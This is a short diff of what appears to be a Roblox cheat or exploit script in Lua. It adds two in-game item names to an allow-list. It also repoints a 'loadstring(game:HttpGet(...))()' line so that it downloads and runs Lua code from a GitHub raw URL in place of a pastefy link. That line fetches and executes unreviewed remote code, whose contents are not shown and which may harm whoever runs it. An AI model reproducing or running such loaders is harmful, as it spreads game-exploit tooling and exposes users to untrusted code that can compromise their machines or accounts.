@@ -102,7 +102,9 @@ genv.ALLOWED_ANIMALS = {
     "Tirilikalika Tirilikalako",
     "Jolly Jolly Sahur",
     "Money Money Bros",
-    "Yetimatic"
+    "Yetimatic",
+    "La Breakfast Combinasion",
+    "La Fuse Machine"
 }
 
 genv.ALLOWED_BASESKINS = {
@@ -131,5 +133,5 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/9FcsOcKO/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
 end)
